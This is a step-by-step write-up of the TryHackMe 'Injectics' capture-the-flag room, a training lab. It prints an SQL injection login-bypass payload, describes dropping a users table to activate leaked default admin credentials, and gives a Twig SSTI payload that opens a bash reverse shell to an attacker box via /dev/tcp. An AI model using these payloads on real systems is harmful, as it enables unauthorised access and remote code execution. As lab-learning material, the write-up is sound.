# TryHackMe Injectics CTF Writeup

<img width="800" height="800" alt="image" src="https://github.com/user-attachments/assets/b6085329-9e44-40aa-804a-4c4cecd22bf5" />

## Introduction

Injectics is the last room in injection-attacks module in TryHackMe and it's a CTF that helps you apply what you learned during this module. 
In this writeup I will help you step by step in solving it explainig everything step and how to think like an expert in injection attacks.

## Enumeration

Following the basic steps for any CTF we start with an nmap scan to see the open ports and services

<img width="720" height="508" alt="image" src="https://github.com/user-attachments/assets/72ae67fd-d4a9-4080-ad63-fe02af361563" />

Now we know this is a website so we start our gobuster scan but we find nothing useful there so I go ahead and start inspecting the page source code and find something very useful

<img width="720" height="315" alt="image" src="https://github.com/user-attachments/assets/ed529d71-3275-4e09-a804-c10579a9648b" />

I find the email for the developer and the page mail.log which is very important here. I navigate to `/mail.log` to find this

<img width="720" height="316" alt="image" src="https://github.com/user-attachments/assets/83a16e06-7f06-4a5f-8f32-e4381e8889e5" />

As you can see here there is the default credentials for both users the developer and the admin but wait… for these credentials to be valid for use the users table need to be dropped for it to apply on them.
Now the first thing that comes to my mind when I saw that was “There will be an SQLI inside there which will let us do that”

## Exploiting

I went back to the login page and tried logging in using the developer email that I found `dev@injectics.thm` but I didn’t know the password so through burp I tried some SQLI payloads in the login page untill I found the right one which was

```
' OR 'x'='x'#;
```

<img width="720" height="331" alt="image" src="https://github.com/user-attachments/assets/9e468642-43e1-4670-826b-f94775951fdf" />

Now I was able to login without the password using SQLI. The first thing I see was a dashboard page

First thing my eyes goes to was that I was able to edit these tables so I thought “This is the only input area in the website and it goes directly to the database so there must be exactly 
where I would be able to drop the users table to be abled to login as admin with the credentials I found”
So I go ahead and use this to drop the users table:

<img width="720" height="332" alt="image" src="https://github.com/user-attachments/assets/693ff2a6-cc88-4359-b45e-a1c6e77bfcd0" />

Now that the users table is dropped the credentials I found in /mail.log should work so I went ahead to the login as admin page and logged in using 
the `username:password superadmin@injectics.thm:superSecurePasswd101` and then I was in!!

I get welcomed by the first flag as you see.

<img width="720" height="315" alt="image" src="https://github.com/user-attachments/assets/61c1bf37-e53e-47b0-a2e5-580beb73ea74" />

Now Looking around I found that I can update my profile information in `/update_profile.php` page so I tried a simple SSTI payload there to test the water

<img width="720" height="315" alt="image" src="https://github.com/user-attachments/assets/32606321-0190-44a5-b716-7ac9d81c7275" />

Going back to the dashboard I was able to confirm that there was SSTI

<img width="720" height="301" alt="image" src="https://github.com/user-attachments/assets/b1aa2ba3-867e-417b-ba38-13ad69d4f317" />

Now I was already thinking that this CTF is over all I need is to get a reverse shell using this SSTI using the following payload:

```
{{ ["bash -c 'exec bash -i >& /dev/tcp/ATTACK-BOX-IP/5555 0>&1'", ""] | sort('passthru') }}
```

And I was able to get a reverse shell as the user `www-data` so I went ahead to the directory flags and got the second flag and by that the CTF was over

<img width="720" height="510" alt="image" src="https://github.com/user-attachments/assets/d8117e7f-92ba-4e85-811f-553be25d907b" />

## Conclusion

Injectics was a great room for practicing multiple injection vulnerabilities in a realistic attack chain. 
Starting from basic enumeration, I was able to discover information disclosure through the mail log, exploit a SQL injection vulnerability to bypass authentication and manipulate the database,
and finally leverage a SSTI vulnerability to achieve remote code execution and obtain a shell on the target system. 
This is also a very good practice at the end of the injection-attacks module to apply for what you learned.

